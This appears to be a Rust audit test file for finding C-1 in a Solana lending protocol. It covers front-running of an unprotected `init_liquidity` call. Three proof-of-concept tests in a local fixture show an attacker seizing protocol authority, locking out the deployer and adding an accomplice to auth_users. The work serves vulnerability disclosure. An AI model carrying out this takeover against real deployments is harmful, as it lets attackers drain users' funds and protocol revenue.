//! [C-1] CRITICAL — Admin PDA Initialization Front-Running
//!
//! # Vulnerability
//!
//! The `init_liquidity` instruction (and equivalent instructions in the vaults,
//! oracle, and flashloan programs) performs **zero access control** on the signer.
//! The singleton PDA (`"liquidity"` seed) is initialized by whoever calls the
//! instruction first.  After that, the PDA is permanently initialized and
//! subsequent calls fail with `AccountAlreadyInitialized`.
//!
//! The caller supplies the `authority` pubkey as a plain instruction argument,
//! meaning the attacker can set their own key as the permanent protocol authority.
//!
//! # Exploit Scenario
//!
//! 1. The Jupiter Lend team deploys the `liquidity` program on-chain.
//! 2. Before the team's deployment script calls `init_liquidity`, an attacker
//!    monitors the mempool / RPC and submits their own `init_liquidity` tx with
//!    their key as `authority`.
//! 3. The attacker's transaction lands first → the `Liquidity` PDA is now owned
//!    by the attacker.
//! 4. The team's own call fails with `AlreadyInUse`.
//! 5. The attacker can now:
//!    - Add arbitrary `auth_users` that can drain funds via `operate`.
//!    - Set a malicious `revenue_collector` to steal all protocol revenue.
//!    - Set all `max_utilization` / rate parameters to drain liquidity reserves.
//!    - Add/remove protocols at will.
//!    - The legitimate team has **zero recourse** — the PDA is immutable.
//!
//! # Tests
//!
//! `test_c1_attacker_seizes_authority` — attacker calls `init_liquidity` first;
//! verifies the resulting `Liquidity` account lists the attacker as authority.
//!
//! `test_c1_legitimate_deployer_locked_out` — after the attacker initializes the
//! PDA, the legitimate team's `init_liquidity` call fails with an
//! account-already-initialized error, confirming the takeover is permanent.
//!
//! `test_c1_attacker_updates_config_post_takeover` — after seizing authority the
//! attacker adds a second wallet to `auth_users` and sets a malicious
//! `revenue_collector`, demonstrating that they have full administrative access.

#[cfg(test)]
mod tests {
    use crate::liquidity::fixture::LiquidityFixture;
    use fluid_test_framework::prelude::*;
    use liquidity::accounts::{InitLiquidity, UpdateAuths, UpdateRevenueCollector};
    use solana_sdk::instruction::Instruction;
    use anchor_lang::{InstructionData, ToAccountMetas};

    const LIQUIDITY_PROGRAM_ID: Pubkey = liquidity::ID;

    // -----------------------------------------------------------------------
    // Helper: build an `init_liquidity` instruction using caller-supplied keys
    // -----------------------------------------------------------------------
    fn build_init_liquidity_ix(
        fixture: &LiquidityFixture,
        signer: &Pubkey,
        authority: &Pubkey,
        revenue_collector: &Pubkey,
    ) -> Instruction {
        let accounts = InitLiquidity {
            signer: *signer,
            liquidity: fixture.get_liquidity(),
            auth_list: fixture.get_auth_list(),
            system_program: anchor_lang::solana_program::system_program::ID,
        };
        Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: accounts.to_account_metas(None),
            data: liquidity::instruction::InitLiquidity {
                authority: *authority,
                revenue_collector: *revenue_collector,
            }
            .data(),
        }
    }

    fn build_update_auths_ix(
        fixture: &LiquidityFixture,
        signer: &Pubkey,
        auth_status: Vec<library::structs::AddressBool>,
    ) -> Instruction {
        let accounts = UpdateAuths {
            authority: *signer,
            liquidity: fixture.get_liquidity(),
            auth_list: fixture.get_auth_list(),
        };
        Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: accounts.to_account_metas(None),
            data: liquidity::instruction::UpdateAuths { auth_status }.data(),
        }
    }

    fn build_update_revenue_collector_ix(
        fixture: &LiquidityFixture,
        signer: &Pubkey,
        revenue_collector: &Pubkey,
    ) -> Instruction {
        let accounts = UpdateRevenueCollector {
            authority: *signer,
            liquidity: fixture.get_liquidity(),
        };
        Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: accounts.to_account_metas(None),
            data: liquidity::instruction::UpdateRevenueCollector {
                revenue_collector: *revenue_collector,
            }
            .data(),
        }
    }

    // -----------------------------------------------------------------------
    // C-1 PoC #1 — Attacker seizes authority
    // -----------------------------------------------------------------------
    /// The attacker calls `init_liquidity` before the legitimate team does.
    /// The resulting `Liquidity` PDA lists the *attacker's* key as authority —
    /// confirming full protocol takeover at zero cost.
    #[test]
    fn test_c1_attacker_seizes_authority() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");

        // Attacker and legitimate admin are different wallets
        let attacker = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let legitimate_admin = fixture.admin.pubkey();

        // ── EXPLOIT ─────────────────────────────────────────────────────────
        // Attacker sends `init_liquidity` with their own key as authority,
        // paying their own rent.  No authorization check prevents this.
        let ix = build_init_liquidity_ix(
            &fixture,
            &attacker.pubkey(),    // signer = attacker
            &attacker.pubkey(),    // authority = attacker  ← attacker-controlled
            &attacker.pubkey(),    // revenue_collector = attacker ← attacker-controlled
        );
        fixture.vm.prank(attacker.pubkey());
        let result = fixture.vm.execute_as_prank(ix);
        // ────────────────────────────────────────────────────────────────────

        assert!(
            result.is_ok(),
            "[C-1] EXPLOIT FAILED (attacker's init_liquidity should succeed): {:?}",
            result.unwrap_err()
        );

        // Verify: attacker is now the authority
        let liquidity = fixture
            .read_liquidity()
            .expect("Failed to read Liquidity PDA");

        assert_eq!(
            liquidity.authority,
            attacker.pubkey(),
            "[C-1] Attacker is NOT the authority — vulnerability may be mitigated"
        );
        assert_ne!(
            liquidity.authority,
            legitimate_admin,
            "[C-1] Legitimate admin should NOT be authority after attacker front-ran"
        );
        assert_eq!(
            liquidity.revenue_collector,
            attacker.pubkey(),
            "[C-1] Revenue collector is controlled by attacker"
        );

        println!(
            "\n[C-1 PROVEN] Attacker ({}) seized authority of the Liquidity PDA.\n\
             Legitimate deployer ({}) is permanently locked out.\n\
             Impact: attacker controls all protocol parameters, auth lists,\n\
             revenue routing, and can drain all user funds.",
            attacker.pubkey(),
            legitimate_admin
        );
    }

    // -----------------------------------------------------------------------
    // C-1 PoC #2 — Legitimate deployer is locked out
    // -----------------------------------------------------------------------
    /// After the attacker initializes the PDA, the legitimate team's call
    /// fails with an account-already-initialized error.
    /// This confirms the takeover is **permanent and irrecoverable**.
    #[test]
    fn test_c1_legitimate_deployer_locked_out() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");

        let attacker = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let legitimate_admin = fixture.admin.insecure_clone();
        let legitimate_admin_pubkey = legitimate_admin.pubkey();

        // Step 1: Attacker initializes the PDA first
        let ix = build_init_liquidity_ix(
            &fixture,
            &attacker.pubkey(),
            &attacker.pubkey(),
            &attacker.pubkey(),
        );
        fixture.vm.prank(attacker.pubkey());
        fixture
            .vm
            .execute_as_prank(ix)
            .expect("Attacker's init_liquidity must succeed");

        // Step 2: Legitimate team tries to initialize — must fail
        let ix_legit = build_init_liquidity_ix(
            &fixture,
            &legitimate_admin_pubkey,
            &legitimate_admin_pubkey,
            &legitimate_admin_pubkey,
        );
        fixture.vm.prank(legitimate_admin_pubkey);
        let result = fixture.vm.execute_as_prank(ix_legit);

        assert!(
            result.is_err(),
            "[C-1] Legitimate deployer should be blocked but their call succeeded — \
             this would mean there is no vulnerability or the test is wrong"
        );

        let err_str = format!("{:?}", result.unwrap_err());
        // Anchor's PDA init constraint produces an AlreadyInUse / 0x0 error
        assert!(
            err_str.contains("already in use")
                || err_str.contains("already initialized")
                || err_str.contains("0x0"),
            "[C-1] Expected AlreadyInUse error, got: {}",
            err_str
        );

        println!(
            "\n[C-1 PROVEN] Legitimate deployer ({}) call failed with: {}\n\
             The protocol is permanently controlled by the attacker.",
            legitimate_admin_pubkey,
            err_str
        );
    }

    // -----------------------------------------------------------------------
    // C-1 PoC #3 — Post-takeover: attacker exercises full admin control
    // -----------------------------------------------------------------------
    /// After seizing authority the attacker adds a second wallet to `auth_users`
    /// and redirects the revenue collector to a wallet under their control.
    /// This proves the impact extends beyond mere ownership — they have
    /// *operational* control over all protocol parameters.
    #[test]
    fn test_c1_attacker_exercises_admin_control() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");

        let attacker = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let attacker_accomplice = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let malicious_revenue_collector = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);

        // ── Step 1: Attacker seizes the Liquidity PDA ─────────────────────
        let ix = build_init_liquidity_ix(
            &fixture,
            &attacker.pubkey(),
            &attacker.pubkey(),
            &malicious_revenue_collector.pubkey(),
        );
        fixture.vm.prank(attacker.pubkey());
        fixture
            .vm
            .execute_as_prank(ix)
            .expect("Attacker init must succeed");

        // ── Step 2: Attacker adds a second wallet to auth_users ────────────
        let add_accomplice_ix = build_update_auths_ix(
            &fixture,
            &attacker.pubkey(),
            vec![library::structs::AddressBool {
                addr: attacker_accomplice.pubkey(),
                value: true,
            }],
        );
        fixture.vm.prank(attacker.pubkey());
        let result = fixture.vm.execute_as_prank(add_accomplice_ix);
        assert!(
            result.is_ok(),
            "[C-1] Attacker should be able to add auth users: {:?}",
            result.unwrap_err()
        );

        // ── Step 3: Verify accomplice is now in auth_users ─────────────────
        let auth_list = fixture
            .read_auth_list()
            .expect("Failed to read auth_list");
        assert!(
            auth_list.auth_users.contains(&attacker.pubkey()),
            "[C-1] Attacker should be in auth_users"
        );
        assert!(
            auth_list.auth_users.contains(&attacker_accomplice.pubkey()),
            "[C-1] Attacker accomplice should be in auth_users"
        );

        // ── Step 4: Verify revenue collector is under attacker's control ───
        let liquidity = fixture.read_liquidity().expect("Failed to read liquidity");
        assert_eq!(
            liquidity.revenue_collector,
            malicious_revenue_collector.pubkey(),
            "[C-1] Revenue collector should be attacker-controlled"
        );

        println!(
            "\n[C-1 PROVEN — Full Control] Attacker controls:\n\
             - Protocol authority: {}\n\
             - Revenue collector: {}\n\
             - auth_users count: {}\n\
             Impact: all protocol revenue is routed to the attacker; they can\n\
             add operators, modify interest rates, drain liquidity reserves,\n\
             and disable or destroy the protocol at will.",
            attacker.pubkey(),
            malicious_revenue_collector.pubkey(),
            auth_list.auth_users.len()
        );
    }
}
